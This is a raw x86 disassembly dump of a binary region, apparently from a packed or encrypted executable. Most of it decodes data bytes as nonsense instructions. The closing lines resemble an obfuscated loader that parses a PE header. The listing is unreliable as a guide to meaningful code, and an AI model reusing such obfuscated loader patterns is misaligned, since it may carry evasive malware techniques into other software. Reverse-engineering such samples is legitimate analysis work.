  40f1d6:	dec    edi
  40f1d7:	dec    edi
  40f1d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d9:	inc    esp
  40f1da:	test   DWORD PTR es:[ebx],edx
  40f1dd:	clc    
  40f1de:	loopne 0x40f239
  40f1e0:	pop    ecx
  40f1e1:	mov    DWORD PTR [ebp-0x5b81c95c],edx
  40f1e7:	cmp    eax,DWORD PTR [edx]
  40f1e9:	inc    esi
  40f1ea:	jmp    0x40f225
  40f1ec:	(bad)  
  40f1ed:	pop    ebx
  40f1ee:	ins    BYTE PTR es:[edi],dx
  40f1ef:	into   
  40f1f0:	inc    ebp
  40f1f1:	rcl    BYTE PTR [esi+0x57],0x54
  40f1f5:	loopne 0x40f234
  40f1f7:	jmp    0xdf076f41
  40f1fc:	xchg   esp,eax
  40f1fd:	inc    ebp
  40f1fe:	adc    eax,DWORD PTR [ebx+0x6dadd7de]
  40f204:	xchg   DWORD PTR [edi-0x6],ebp
  40f207:	push   ebp
  40f208:	and    BYTE PTR [ecx],bh
  40f20a:	pop    ebp
  40f20b:	in     al,dx
  40f20c:	cmp    DWORD PTR ds:0x9d7888bf,esp
  40f212:	jecxz  0x40f283
  40f214:	les    ebp,FWORD PTR [eax]
  40f216:	jno    0x40f293
  40f218:	and    BYTE PTR [eax],ah
  40f21a:	in     eax,0xc6
  40f21c:	cmc    
  40f21d:	and    ebp,DWORD PTR [eax-0x2a39bebc]
  40f223:	sub    eax,0xb8fbbd79
  40f228:	jge    0x40f200
  40f22a:	inc    eax
  40f22b:	inc    esi
  40f22c:	out    dx,al
  40f22d:	addr16 jle 0x40f217
  40f230:	and    al,0x7
  40f232:	xchg   edx,eax
  40f233:	jne    0x40f20c
  40f235:	js     0x40f1ee
  40f237:	pop    edi
  40f238:	into   
  40f239:	jno    0x40f20b
  40f23b:	stc    
  40f23c:	mov    DWORD PTR [esi+0x4f],esi
  40f23f:	jge    0x40f1f3
  40f241:	jb     0x40f20a
  40f243:	xor    esi,ebp
  40f245:	into   
  40f246:	sub    eax,0x33bd4902
  40f24c:	mov    al,bh
  40f24e:	cli    
  40f24f:	jmp    0x5411:0x9e30cf02
  40f256:	pop    es
  40f257:	sbb    DWORD PTR [eax*1-0x78a0080],esp
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx+0x4a073dd9]
  40f282:	and    esp,DWORD PTR [ecx-0x56]
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f272
  40f28c:	gs jno 0x40f264
  40f28f:	mov    dh,0xf8
  40f291:	jbe    0x40f24d
  40f293:	dec    esp
  40f294:	dec    edx
  40f295:	jne    0x40f24f
  40f297:	jbe    0x40f269
  40f299:	adc    DWORD PTR [edx],0x9f1b0017
  40f29f:	mov    dh,0x69
  40f2a1:	pushf  
  40f2a2:	int    0xe1
  40f2a4:	add    al,BYTE PTR [ebx]
  40f2a6:	sahf   
  40f2a7:	cs sahf 
  40f2a9:	sahf   
  40f2aa:	js     0x40f288
  40f2ac:	cmp    cl,ch
  40f2ae:	push   edi
  40f2af:	sub    al,0x17
  40f2b1:	inc    ebp
  40f2b2:	or     BYTE PTR [esp+esi*8],0xa9
  40f2b6:	sbb    DWORD PTR [edx+0x9],esi
  40f2b9:	dec    eax
  40f2ba:	repz (bad)
  40f2bd:	test   eax,0xa7af8551
  40f2c2:	cmp    al,0x4a
  40f2c4:	daa    
  40f2c5:	xchg   esi,eax
  40f2c6:	pusha  
  40f2c7:	pop    esi
  40f2c8:	sbb    BYTE PTR [ecx],cl
  40f2ca:	or     eax,0x243615de
  40f2cf:	sar    eax,cl
  40f2d1:	and    edx,DWORD PTR [eax]
  40f2d3:	xor    DWORD PTR [ebp-0x4fddc39a],esi
  40f2d9:	(bad)  
  40f2da:	lock push esi
  40f2dc:	call   0xdf62afea
  40f2e1:	jae    0x40f335
  40f2e3:	stc    
  40f2e4:	jmp    0x3c61f5c
  40f2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2ea:	bound  esp,QWORD PTR [eax-0x4060bb70]
  40f2f0:	xor    BYTE PTR [eax],al
  40f2f2:	jg     0x40f341
  40f2f4:	repz call 0x73a90381
  40f2fa:	and    BYTE PTR [eax+0x7c42af67],bl
  40f300:	lods   al,BYTE PTR ds:[esi]
  40f301:	add    dh,BYTE PTR [ecx]
  40f303:	mov    ch,0x4b
  40f305:	or     ebx,DWORD PTR [ebp+0x117e42b]
  40f30b:	popa   
  40f30c:	pop    ss
  40f30d:	cli    
  40f30e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f30f:	xchg   esi,eax
  40f310:	out    0x1,eax
  40f312:	or     BYTE PTR [ecx-0x22],bh
  40f315:	lods   eax,DWORD PTR ds:[esi]
  40f316:	pop    ebp
  40f317:	mov    bh,0x3f
  40f319:	pusha  
  40f31a:	pop    ebx
  40f31b:	push   eax
  40f31c:	inc    ecx
  40f31d:	(bad)  
  40f31e:	retf   0x2701
  40f321:	call   0x4673:0xc361b3bd
  40f328:	(bad)  
  40f329:	mov    esi,0xe540fd4c
  40f32e:	je     0x40f2bf
  40f330:	jle    0x40f338
  40f332:	jb     0x40f2ec
  40f334:	in     eax,dx
  40f335:	pop    edx
  40f336:	dec    edi
  40f337:	sub    bl,0x4e
  40f33a:	pop    edx
  40f33b:	cmp    BYTE PTR [edi+edx*4+0x5b38be5e],bl
  40f342:	push   ebp
  40f343:	sahf   
  40f344:	pushf  
  40f345:	mov    ebp,0x75d89fcc
  40f34a:	mov    cl,0x83
  40f34c:	xlat   BYTE PTR ds:[ebx]
  40f34d:	jmp    0xec02:0x42371559
  40f354:	push   ebp
  40f355:	fnsave [edi]
  40f357:	cs push esp
  40f359:	les    edi,FWORD PTR [eax-0x80]
  40f35c:	aam    0x87
  40f35e:	inc    ebp
  40f35f:	jae    0x40f30c
  40f361:	mov    esp,0x16b9c7f3
  40f366:	test   dh,ch
  40f368:	and    ch,dh
  40f36a:	mov    edi,DWORD PTR [eax]
  40f36c:	int    0xa7
  40f36e:	ret    
  40f36f:	stc    
  40f370:	pushf  
  40f371:	es cld 
  40f373:	adc    ch,BYTE PTR [edi-0x45c13804]
  40f379:	add    eax,ebx
  40f37b:	jp     0x40f366
  40f37d:	stos   DWORD PTR es:[edi],eax
  40f37e:	aam    0x3d
  40f380:	nop
  40f381:	outs   dx,BYTE PTR fs:[esi]
  40f383:	xchg   edx,ebx
  40f385:	sub    al,0xbb
  40f387:	shl    BYTE PTR [edx],cl
  40f389:	mov    eax,0xa9c75bad
  40f38e:	in     eax,dx
  40f38f:	stos   DWORD PTR es:[edi],eax
  40f390:	inc    DWORD PTR [edx-0x259af93d]
  40f396:	imul   esi,DWORD PTR [ecx+ebx*4+0x5dd691b6],0x3ec5fc4d
  40f3a1:	mov    ecx,0x3c550e33
  40f3a6:	out    dx,al
  40f3a7:	retf   0xbacb
  40f3aa:	cld    
  40f3ab:	fadd   st,st(2)
  40f3ad:	aas    
  40f3ae:	adc    DWORD PTR [ebp+0x2387056e],edx
  40f3b4:	div    esp
  40f3b6:	inc    edi
  40f3b7:	enter  0xb7bc,0x8d
  40f3bb:	loopne 0x40f3e0
  40f3bd:	mov    DWORD PTR [edi],ebp
  40f3bf:	cli    
  40f3c0:	rcr    DWORD PTR [ebp+0x541a1267],0xbb
  40f3c7:	mov    ds:0x21d659ff,al
  40f3cc:	mov    ds:0x974d799c,al
  40f3d1:	dec    ecx
  40f3d2:	je     0x40f3b5
  40f3d4:	jne    0x40f3e5
  40f3d6:	sbb    bh,dl
  40f3d8:	sub    esp,DWORD PTR [ebp+0x3cd80f46]
  40f3de:	jne    0x40f459
  40f3e0:	cdq    
  40f3e1:	dec    esi
  40f3e2:	jns    0x40f44b
  40f3e4:	scas   al,BYTE PTR es:[edi]
  40f3e5:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40f3e7:	adc    al,0x15
  40f3e9:	jge    0x40f36d
  40f3eb:	adc    al,0xdf
  40f3ed:	loop   0x40f46e
  40f3ef:	sbb    eax,0xfba83e84
  40f3f4:	arpl   WORD PTR [eax+0x62],bx
  40f3f7:	jg     0x40f3b5
  40f3f9:	cmp    al,0xde
  40f3fb:	pop    eax
  40f3fc:	push   es
  40f3fd:	xchg   DWORD PTR [edi],esp
  40f3ff:	out    0x27,al
  40f401:	pop    esi
  40f402:	mov    ebx,0x40ff380b
  40f407:	scas   al,BYTE PTR es:[edi]
  40f408:	mov    DWORD PTR [ebx+0x6a1f7a8],eax
  40f40e:	pop    es
  40f40f:	(bad)  
  40f410:	in     al,0x52
  40f412:	or     BYTE PTR [eax-0x14],bh
  40f415:	out    dx,eax
  40f416:	test   DWORD PTR [edi+0x65],eax
  40f419:	jle    0x40f470
  40f41b:	leave  
  40f41c:	mov    cs:0xe21baf8b,eax
  40f422:	jg     0x40f406
  40f424:	fild   WORD PTR [eax]
  40f426:	inc    eax
  40f427:	jmp    0x40f3ae
  40f429:	pop    eax
  40f42a:	pop    esp
  40f42b:	xor    DWORD PTR [edx-0x3c],esi
  40f42e:	cli    
  40f42f:	ror    DWORD PTR [edi+0x1f],1
  40f432:	pop    ebp
  40f433:	jmp    0x5459f78c
  40f438:	xor    DWORD PTR [ebp-0xd],esi
  40f43b:	loope  0x40f478
  40f43d:	dec    edx
  40f43e:	neg    cl
  40f440:	pop    es
  40f441:	cmp    BYTE PTR [ebx-0x4be42109],cl
  40f447:	xor    dh,bl
  40f449:	inc    ebx
  40f44a:	sbb    ch,BYTE PTR [edi+0x1c]
  40f44d:	icebp  
  40f44e:	gs xchg ecx,eax
  40f450:	aad    0xcb
  40f452:	jbe    0x40f460
  40f454:	std    
  40f455:	fidiv  WORD PTR [ecx-0x62]
  40f458:	scas   al,BYTE PTR es:[edi]
  40f459:	call   0x2827:0x1801c072
  40f460:	add    eax,0xc20d5902
  40f465:	xchg   edi,eax
  40f466:	iret   
  40f467:	loopne 0x40f436
  40f469:	cmc    
  40f46a:	pop    fs
  40f46c:	gs jmp 0x2ef0:0xb367aca2
  40f474:	fwait
  40f475:	out    dx,eax
  40f476:	add    ebx,DWORD PTR [edi+eiz*8-0x1d]
  40f47a:	adc    DWORD PTR [edi*2-0x74215c3b],ebp
  40f481:	xchg   BYTE PTR [ebx-0x30],cl
  40f484:	fmul   DWORD PTR [ebx-0x17d605a2]
  40f48a:	cld    
  40f48b:	in     eax,dx
  40f48c:	out    dx,eax
  40f48d:	sub    esp,eax
  40f48f:	mov    WORD PTR [edx-0x2a],?
  40f492:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40f494:	retf   
  40f495:	leave  
  40f496:	xchg   esi,eax
  40f497:	lods   eax,DWORD PTR ds:[esi]
  40f498:	fwait
  40f499:	adc    BYTE PTR [ecx+0x3e],bl
  40f49c:	sub    DWORD PTR [eax-0x60c39720],0x58
  40f4a3:	sbb    al,0xa8
  40f4a5:	xchg   ebx,eax
  40f4a6:	fcomp  QWORD PTR [eax]
  40f4a8:	pop    edi
  40f4a9:	idiv   DWORD PTR [ecx]
  40f4ab:	or     ebx,esp
  40f4ad:	les    ecx,FWORD PTR [eax-0x78]
  40f4b0:	and    eax,0x3c532b23
  40f4b5:	mov    ah,0xe1
  40f4b7:	mov    ecx,0x1914edbe
  40f4bc:	mov    al,ds:0xa175dafc
  40f4c1:	les    esi,FWORD PTR [edi]
  40f4c3:	sahf   
  40f4c4:	inc    BYTE PTR [ecx+0x5f]
  40f4c7:	jbe    0x40f511
  40f4c9:	arpl   WORD PTR [edx],ax
  40f4cb:	jbe    0x40f455
  40f4cd:	repnz mov bl,ch
  40f4d0:	mov    ecx,0x84f9a4c0
  40f4d5:	xchg   ecx,eax
  40f4d6:	inc    ebx
  40f4d7:	(bad)  
  40f4d9:	mov    edi,0x4235bf83
  40f4de:	(bad)  
  40f4df:	sti    
  40f4e0:	add    ah,BYTE PTR [ebx]
  40f4e2:	or     al,0x30
  40f4e4:	clc    
  40f4e5:	pop    edi
  40f4e6:	out    0x6b,eax
  40f4e8:	or     edi,DWORD PTR [edx]
  40f4ea:	fidiv  WORD PTR [esp+ebx*8+0x51]
  40f4ee:	retf   
  40f4ef:	lods   al,BYTE PTR ds:[esi]
  40f4f0:	cmp    DWORD PTR [edi+eax*8],edx
  40f4f3:	xlat   BYTE PTR ds:[ebx]
  40f4f4:	lods   eax,DWORD PTR ds:[esi]
  40f4f5:	mov    esp,0xb6af206f
  40f4fa:	shr    DWORD PTR [esi-0x7bb4969b],1
  40f500:	adc    eax,0x7fc03e22
  40f505:	lock not BYTE PTR cs:[esi]
  40f509:	ds mov dh,0x7c
  40f50c:	sbb    edi,ecx
  40f50e:	out    0x9b,eax
  40f510:	sbb    bh,dh
  40f512:	imul   esp,DWORD PTR [ebp+0x4a],0x66
  40f516:	mov    ch,0x20
  40f518:	sub    ch,ah
  40f51a:	xchg   ebx,eax
  40f51b:	cs int 0xd0
  40f51e:	or     dl,BYTE PTR [edi]
  40f520:	cmp    eax,edi
  40f522:	xchg   BYTE PTR [ebx+0x67745750],al
  40f528:	sub    DWORD PTR [ebx+esi*8+0xaf5d7b3],edi
  40f52f:	mov    esi,0x89740d74
  40f534:	test   DWORD PTR fs:[ebx],0xdbd60f01
  40f53b:	(bad)  
  40f53c:	lahf   
  40f53d:	js     0x40f5b9
  40f53f:	xor    bl,dh
  40f541:	and    al,BYTE PTR [edi-0x3d6d36c0]
  40f547:	loop   0x40f5ae
  40f549:	loop   0x40f4f6
  40f54b:	dec    esp
  40f54c:	or     BYTE PTR [edx+0x7a],bl
  40f54f:	push   esp
  40f550:	out    0xf7,al
  40f552:	lds    esp,FWORD PTR [eax-0x3296412d]
  40f558:	pop    ebp
  40f559:	xor    eax,0xaca6358f
  40f55e:	mov    ebx,0x60a8199d
  40f563:	jle    0x40f5b3
  40f565:	push   ds
  40f566:	xor    al,0xd4
  40f568:	shr    BYTE PTR [edi+0x7002c488],0x6e
  40f56f:	in     al,dx
  40f570:	div    BYTE PTR [ebp+0x3c]
  40f573:	fimul  DWORD PTR [ebx+0x61]
  40f576:	push   0xe6deae7c
  40f57b:	data16 (bad) 
  40f57d:	push   ebp
  40f57e:	adc    al,0x15
  40f580:	aam    0xf9
  40f582:	(bad)  
  40f583:	fadd   QWORD PTR [edi+0x2c94462b]
  40f589:	and    al,0x55
  40f58b:	mov    ds:0xd02d050e,al
  40f590:	rol    BYTE PTR [ecx],1
  40f592:	pushf  
  40f593:	enter  0x9033,0x5e
  40f597:	cmp    BYTE PTR ds:0xad30279a,bl
  40f59d:	dec    esi
  40f59e:	cmp    DWORD PTR [edi-0x7f],ebx
  40f5a1:	sub    al,0x1f
  40f5a3:	les    edi,FWORD PTR [edx+0x7e4464a0]
  40f5a9:	xchg   ebx,eax
  40f5aa:	sbb    BYTE PTR [esi],bl
  40f5ac:	sbb    esi,esi
  40f5ae:	jle    0x40f59f
  40f5b0:	add    bh,BYTE PTR [edx]
  40f5b2:	mov    ebx,0xc6c74f5f
  40f5b7:	xchg   ebx,eax
  40f5b8:	inc    BYTE PTR [ebx]
  40f5ba:	rcr    DWORD PTR [eax],cl
  40f5bc:	pop    ebx
  40f5bd:	fdiv   QWORD PTR [eax-0x2b]
  40f5c0:	shl    ch,0x56
  40f5c3:	cmp    bl,BYTE PTR [ebx+0x60]
  40f5c6:	xor    eax,eax
  40f5c8:	sbb    al,BYTE PTR [esp+esi*4+0x6192b797]
  40f5cf:	je     0x40f5d4
  40f5d1:	popf   
  40f5d2:	ds push ss
  40f5d4:	sbb    bl,BYTE PTR [edx*8-0x6245e4e7]
  40f5db:	xchg   ebp,eax
  40f5dc:	sbb    ebp,eax
  40f5de:	adc    dl,dh
  40f5e0:	test   eax,0x5cdfe24e
  40f5e5:	jae    0x40f63b
  40f5e7:	mov    esp,0x15695025
  40f5ec:	mov    edx,0x29bb372b
  40f5f1:	mov    dl,0x8
  40f5f3:	jb     0x40f63e
  40f5f5:	push   edi
  40f5f6:	or     BYTE PTR [edi+0x7b795693],ah
  40f5fc:	jmp    0xdb2fd3a
  40f601:	mov    esp,0xbfdbadd9
  40f606:	stc    
  40f607:	mov    dh,0xfd
  40f609:	pop    es
  40f60a:	add    ebx,DWORD PTR [esi+0x42]
  40f60d:	pop    ss
  40f60e:	mov    esi,0x1c1771aa
  40f613:	xor    eax,DWORD PTR [ecx]
  40f615:	dec    esi
  40f616:	xchg   esi,eax
  40f617:	(bad)  
  40f618:	shl    DWORD PTR [edx+ebx*2],0xd8
  40f61c:	bnd je 0x40f61b
  40f61f:	xchg   ebp,eax
  40f620:	fcom   QWORD PTR [esi+0x3f7534d6]
  40f626:	ds pop ecx
  40f628:	scas   al,BYTE PTR es:[edi]
  40f629:	jo     0x40f5c7
  40f62b:	(bad)  
  40f62c:	outs   dx,DWORD PTR ds:[esi]
  40f62d:	paddusb mm2,mm7
  40f630:	in     al,0xfb
  40f632:	rol    BYTE PTR [edi+0xcc2c95e],cl
  40f638:	add    BYTE PTR [ebp-0x75],dl
  40f63b:	in     al,dx
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4335ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4335df,0x4335a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0xba194800
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0xf17c7c7e
  40f67b:	loope  0x40f601
  40f67d:	clc    
  40f67e:	mov    ecx,eax
  40f680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f681:	xor    edx,edi
  40f683:	sbb    eax,0x17c420f9
  40f688:	jmp    0x7098:0xff813eef
  40f68f:	pop    esp
  40f690:	das    
  40f691:	xchg   ebp,eax
  40f692:	jp     0x40f713
  40f694:	outs   dx,BYTE PTR ds:[esi]
  40f695:	push   0x56
  40f697:	pop    ds
  40f698:	sti    
  40f699:	jecxz  0x40f705
  40f69b:	inc    edi
  40f69c:	call   0x933638cf
  40f6a1:	bound  edi,QWORD PTR [edi+0x5]
  40f6a4:	mov    dh,BYTE PTR [esi+0x4f]
  40f6a7:	(bad)  
  40f6a8:	mov    ds:0xeac807c2,eax
  40f6ad:	ror    BYTE PTR [edi+0x5a02bd2d],1
  40f6b3:	and    bl,al
  40f6b5:	out    0x48,al
  40f6b7:	sti    
  40f6b8:	or     al,0x76
  40f6ba:	inc    ebx
  40f6bb:	sub    edx,DWORD PTR [edx+ebx*1+0x768870cc]
  40f6c2:	fild   DWORD PTR [ebp+0x27]
  40f6c5:	icebp  
  40f6c6:	ins    DWORD PTR es:[edi],dx
  40f6c7:	pop    ss
  40f6c8:	adc    BYTE PTR fs:[ebp+0x76],al
  40f6cc:	sbb    BYTE PTR [esi],ch
  40f6ce:	mov    esi,0xbd343019
  40f6d3:	(bad)  
  40f6d4:	adc    ebp,DWORD PTR [edi-0x1985a19e]
  40f6da:	adc    eax,0x206d74bd
  40f6df:	inc    edx
  40f6e0:	ds (bad) 
  40f6e2:	stc    
  40f6e3:	daa    
  40f6e4:	fisubr DWORD PTR [ebp-0x7569911]
  40f6ea:	mov    esi,0x80adb454
  40f6ef:	adc    bl,BYTE PTR [edx+0x3e]
  40f6f2:	rcr    ecx,1
  40f6f4:	arpl   cx,bx
  40f6f6:	mov    ah,0xcc
  40f6f8:	and    eax,DWORD PTR [edi-0x41f254af]
  40f6fe:	jnp    0x40f711
  40f700:	fild   WORD PTR [edx+0x13]
  40f703:	pop    edi
  40f704:	mov    ds:0xb059cb54,al
  40f709:	enter  0x8815,0x28
  40f70d:	out    dx,al
  40f70e:	cli    
  40f70f:	fist   DWORD PTR [ecx+edx*1-0x74]
  40f713:	dec    eax
  40f714:	in     eax,dx
  40f715:	and    al,0x7f
  40f717:	fwait
  40f718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f719:	add    DWORD PTR [ebx+0x20],esp
  40f71c:	lock push ebp
  40f71e:	mov    dh,BYTE PTR [esi+0x38]
  40f721:	mov    bl,0xc5
  40f723:	ins    BYTE PTR es:[edi],dx
  40f724:	and    bl,BYTE PTR [edx+0x4]
  40f727:	jno    0x40f772
  40f729:	or     BYTE PTR [eax],al
  40f72b:	icebp  
  40f72c:	xchg   edi,eax
  40f72d:	add    BYTE PTR [edi+0x77118be4],bh
  40f733:	dec    ecx
  40f734:	or     ch,BYTE PTR [esi]
  40f736:	ins    BYTE PTR es:[edi],dx
  40f737:	xor    DWORD PTR [ecx+0x4398d363],0xffffffba
  40f73e:	push   ds
  40f73f:	mov    edx,0x10b1e2a2
  40f744:	mov    dh,0x9c
  40f746:	and    BYTE PTR [eax],0xb2
  40f749:	scas   al,BYTE PTR es:[edi]
  40f74a:	lahf   
  40f74b:	jae    0x40f7aa
  40f74d:	loopne 0x40f719
  40f74f:	and    al,0x24
  40f751:	scas   eax,DWORD PTR es:[edi]
  40f752:	imul   esi,DWORD PTR [eax+0x9efd2a0],0x22
  40f759:	sub    edi,edx
  40f75b:	mov    eax,0x91cf4b84
  40f760:	inc    edi
  40f761:	push   ds
  40f762:	pop    eax
  40f763:	lods   al,BYTE PTR ds:[esi]
  40f764:	mov    dl,0xd
  40f766:	jp     0x40f795
  40f768:	and    ecx,DWORD PTR [ecx+0x4eda745c]
  40f76e:	repnz leave 
  40f770:	dec    ebx
  40f771:	aad    0x26
  40f773:	xchg   edx,eax
  40f774:	fist   DWORD PTR [ecx]
  40f776:	mov    ecx,0x8e66239c
  40f77b:	mov    esi,DWORD PTR [ebx]
  40f77d:	inc    edi
  40f77e:	shr    BYTE PTR [edi+0x19],cl
  40f781:	pop    esi
  40f782:	or     bh,ah
  40f784:	add    al,0x7f
  40f786:	outs   dx,BYTE PTR ds:[esi]
  40f787:	pop    ecx
  40f788:	mov    al,0x56
  40f78a:	fwait
  40f78b:	adc    BYTE PTR [edx],dl
  40f78d:	sub    BYTE PTR [eax-0xc],0x16
  40f791:	jge    0x40f749
  40f793:	aas    
  40f794:	add    BYTE PTR [ebx],al
  40f796:	push   cs
  40f797:	mov    edx,0xcd5f7779
  40f79c:	js     0x40f7ba
  40f79e:	daa    
  40f79f:	retf   
  40f7a0:	sbb    eax,0x775a290f
  40f7a5:	mov    eax,0x5dc01793
  40f7aa:	xor    eax,0x35d93545
  40f7af:	test   eax,0xd61c1e34
  40f7b4:	pushf  
  40f7b5:	bswap  esp
  40f7b7:	repz mov ds:0xb0e36617,eax
  40f7bd:	xchg   BYTE PTR [esi+0x67],cl
  40f7c0:	dec    esi
  40f7c1:	js     0x40f82d
  40f7c3:	xchg   edi,eax
  40f7c4:	inc    ebx
  40f7c5:	pop    ss
  40f7c6:	ins    BYTE PTR es:[edi],dx
  40f7c7:	fs mov ch,0xa9
  40f7ca:	push   ds
  40f7cb:	sbb    eax,0xe474557c
  40f7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d1:	ins    BYTE PTR es:[edi],dx
  40f7d2:	push   0x70
  40f7d4:	repnz out dx,al
  40f7d6:	cdq    
  40f7d7:	imul   esp,DWORD PTR [eax-0x78],0xffffffc7
  40f7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7dc:	mov    eax,0x421fd1fc
  40f7e1:	rol    DWORD PTR [esi-0x48741e65],1
  40f7e7:	fmul   DWORD PTR [ebx+edx*2+0x77]
  40f7eb:	cmp    DWORD PTR [eax-0x22],ebp
  40f7ee:	cmp    eax,0x9395d3b4
  40f7f3:	mov    esi,0xf516db9b
  40f7f8:	add    al,0x6a
  40f7fa:	sar    BYTE PTR ds:0xea2113e2,0x1a
  40f801:	push   0xe082c094
  40f806:	xchg   ecx,eax
  40f807:	call   FWORD PTR [edx+0x21]
  40f80a:	mov    esp,0xd7b1bd64
  40f80f:	pop    ebx
  40f810:	imul   ebx,DWORD PTR [edi+0x68],0x798d47a1
  40f817:	push   edx
  40f818:	jge    0x40f882
  40f81a:	jae    0x40f7b3
  40f81c:	inc    edx
  40f81d:	cmp    bh,0x4d
  40f820:	dec    esp
  40f821:	std    
  40f822:	scas   al,BYTE PTR es:[edi]
  40f823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f824:	jae    0x40f81b
  40f826:	mov    edi,0x63f58888
  40f82b:	sbb    esi,DWORD PTR [esi-0x6079bcc7]
  40f831:	sbb    eax,0x58273162
  40f836:	ds mov ah,0xb0
  40f839:	test   BYTE PTR [edx-0x64e9556e],ah
  40f83f:	adc    eax,0xa8baee99
  40f844:	fld    QWORD PTR [ecx+edx*1]
  40f847:	sub    eax,0x28d852a0
  40f84c:	push   cs
  40f84d:	test   eax,0x81df97dc
  40f852:	jmp    0x68497b25
  40f857:	jge    0x40f7f5
  40f859:	cmp    DWORD PTR [ebp-0x57],edx
  40f85c:	(bad)  
  40f85e:	in     eax,dx
  40f85f:	push   cs
  40f860:	xor    DWORD PTR [ecx],0x57b7452a
  40f866:	mov    esp,DWORD PTR [edi-0x6b701947]
  40f86c:	jo     0x40f8c2
  40f86e:	pop    ebx
  40f86f:	(bad)  
  40f870:	aam    0x1e
  40f872:	fwait
  40f873:	rep lods al,BYTE PTR ds:[esi]
  40f875:	or     eax,0xf4499229
  40f87a:	adc    al,0x9c
  40f87c:	test   DWORD PTR ds:0xe12f5f48,ebx
  40f882:	xchg   ebp,eax
  40f883:	shr    DWORD PTR [edx+ebp*1-0x342199fc],cl
  40f88a:	nop
  40f88b:	stos   BYTE PTR es:[edi],al
  40f88c:	push   ebx
  40f88d:	sub    al,0x9e
  40f88f:	xchg   ecx,eax
  40f890:	jnp    0x40f910
  40f892:	int    0x83
  40f894:	fld    TBYTE PTR [ebx]
  40f896:	mov    ecx,0xcb58c65f
  40f89b:	fdivrp st(0),st
  40f89d:	js     0x40f882
  40f89f:	mov    bh,0xcf
  40f8a1:	xchg   edi,eax
  40f8a2:	loopne 0x40f8fa
  40f8a4:	pop    ds
  40f8a5:	js     0x40f8ab
  40f8a7:	sub    dh,ah
  40f8a9:	add    ah,BYTE PTR [ebx-0x51]
  40f8ac:	shr    BYTE PTR [esi-0x5d42b435],1
  40f8b2:	push   ecx
  40f8b3:	cld    
  40f8b4:	stos   DWORD PTR es:[edi],eax
  40f8b5:	inc    ebx
  40f8b6:	call   0x8f8f:0xce746441
  40f8bd:	push   eax
  40f8be:	mov    dl,0xbd
  40f8c0:	sar    BYTE PTR [ebx-0x3d9e605e],cl
  40f8c6:	test   BYTE PTR [eax+0x3e],0x67
  40f8ca:	xor    DWORD PTR [esi-0x3f],eax
  40f8cd:	push   esp
  40f8ce:	adc    DWORD PTR [esi+edx*2-0x2250836c],ebx
  40f8d5:	lahf   
  40f8d6:	inc    ebp
  40f8d7:	leave  
  40f8d8:	lea    bx,[edx-0x42]
  40f8dc:	ds mov cl,BYTE PTR gs:[eax-0x550b7e28]
  40f8e4:	jge    0x40f8ae
  40f8e6:	mov    ch,0x20
  40f8e8:	add    DWORD PTR fs:[eax+ebx*4-0x8],esp
  40f8ed:	or     dl,BYTE PTR [ebp-0x59f5a54f]
  40f8f3:	xor    BYTE PTR [edx+0x9],0x64
  40f8f7:	cmp    dl,BYTE PTR [ecx]
  40f8f9:	or     DWORD PTR [ebx-0x4330791f],esp
  40f8ff:	jne    0x40f949
  40f901:	jle    0x40f90e
  40f903:	loopne 0x40f976
  40f905:	stos   DWORD PTR es:[edi],eax
  40f906:	arpl   dx,di
  40f908:	dec    ebx
  40f909:	fwait
  40f90a:	mov    eax,0x77a5badc
  40f90f:	xlat   BYTE PTR ds:[ebx]
  40f910:	jne    0x40f8b1
  40f912:	int3   
  40f913:	add    BYTE PTR [ebp+0x33f14a2e],0xae
  40f91a:	fwait
  40f91b:	call   0x1abb875c
  40f920:	xchg   esp,eax
  40f921:	adc    al,0x9d
  40f923:	and    DWORD PTR [edx+0x4],ebx
  40f926:	cmp    DWORD PTR [ecx+0x43362b25],eax
  40f92c:	add    BYTE PTR [edi+0x34004335],ah
  40f932:	inc    ebp
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43355f
  40f947:	add    DWORD PTR ds:0x433547,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43362f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433617,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4335a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433663
